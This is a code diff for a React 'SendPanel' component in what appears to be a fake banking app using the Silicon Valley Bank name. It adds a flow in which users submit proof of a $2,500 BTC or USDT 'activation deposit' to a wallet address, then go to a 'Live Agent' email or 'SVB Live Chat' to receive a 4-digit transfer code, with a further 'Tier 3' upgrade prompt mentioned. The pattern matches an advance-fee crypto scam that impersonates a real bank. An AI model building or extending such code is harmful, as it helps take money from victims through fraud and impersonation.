@@ -24,6 +24,10 @@ import {
   Check, 
   ShieldAlert 
 } from 'lucide-react';
+import { PaymentProofOptionsModal } from './PaymentProofOptionsModal';
+import { triggerOpenSVBLiveChat } from './SupportChatWidget';
+import { openLiveAgentEmail } from '../utils/supportEmail';
+import { BackButton } from './BackButton';
 
 interface SendPanelProps {
   user: User;
@@ -57,6 +61,7 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigat
   // Deposit $2,500 USD activation requirement modal state
   const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
   const [showCryptoModal, setShowCryptoModal] = useState(false);
+  const [showProofOptionsModal, setShowProofOptionsModal] = useState(false);
   const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
   const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
   const [txHash, setTxHash] = useState('');
@@ -254,8 +259,40 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigat
     }
   };
 
-  const handleCryptoDepositSubmit = async (e: React.FormEvent) => {
+  const handleCryptoDepositSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    setShowProofOptionsModal(true);
+  };
+
+  const handleSelectLiveAgent = async () => {
+    setShowProofOptionsModal(false);
+    setShowCryptoModal(false);
+    
+    // Launch user's default email client
+    openLiveAgentEmail(user, {
+      method: cryptoMethod,
+      amount: 2500,
+      walletAddress: walletAddresses[cryptoMethod]
+    });
+
+    try {
+      const res = await api.submitCryptoActivationDeposit({
+        cryptoMethod,
+        txHash: '',
+        proofNote: 'Submitted to Live Agent (External Email)',
+        proofImage: undefined
+      });
+      if (res.user && onSuccess) {
+        onSuccess(res.user, null as any);
+      }
+      setDepositSuccessMsg(`Payment proof details opened in your email client. Our Live Support agent will verify and issue your 4-Digit Code.`);
+      setTimeout(() => setDepositSuccessMsg(null), 5000);
+    } catch (err: any) {
+      console.error(err);
+    }
+  };
+
+  const handleSelectSVBLive = async () => {
     setError(null);
     setSubmittingDeposit(true);
 
@@ -269,14 +306,15 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigat
       if (res.user && onSuccess) {
         onSuccess(res.user, null as any);
       }
-      setDepositSuccessMsg(`Your $2,500 ${cryptoMethod} deposit proof has been submitted to Silicon Valley Bank for verification.`);
+      setShowProofOptionsModal(false);
+      setShowCryptoModal(false);
+      setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
+      
+      // Open Live Chat Widget
       setTimeout(() => {
-        setShowCryptoModal(false);
+        triggerOpenSVBLiveChat();
         setDepositSuccessMsg(null);
-        if (onNavigateTab) {
-          onNavigateTab('support');
-        }
-      }, 800);
+      }, 500);
     } catch (err: any) {
       setError(err.message || 'Failed to submit activation deposit proof.');
     } finally {
@@ -293,7 +331,12 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigat
     : [];
 
   return (
-    <div className="max-w-4xl mx-auto space-y-8 pb-12">
+    <div className="max-w-4xl mx-auto space-y-6 pb-12">
+      {/* Top Navigation Row */}
+      <div className="flex items-center justify-between">
+        <BackButton />
+      </div>
+
       {/* Header Banner */}
       <div className="bg-gradient-to-r from-slate-900 via-teal-950 to-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
         <div className="absolute top-0 right-0 w-80 h-80 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />
@@ -850,6 +893,18 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigat
           </div>
         </div>
       )}
+
+      {/* Payment Proof Options Modal */}
+      <PaymentProofOptionsModal
+        isOpen={showProofOptionsModal}
+        onClose={() => setShowProofOptionsModal(false)}
+        user={user}
+        cryptoMethod={cryptoMethod}
+        walletAddress={walletAddresses[cryptoMethod]}
+        onSelectLiveAgent={handleSelectLiveAgent}
+        onSelectSVBLive={handleSelectSVBLive}
+        submitting={submittingDeposit}
+      />
 
       {/* Requirement 5 Modal: Tier 3 Upgrade Prompt when user tries to execute transfer with code */}
       {showTier3PromptModal && (
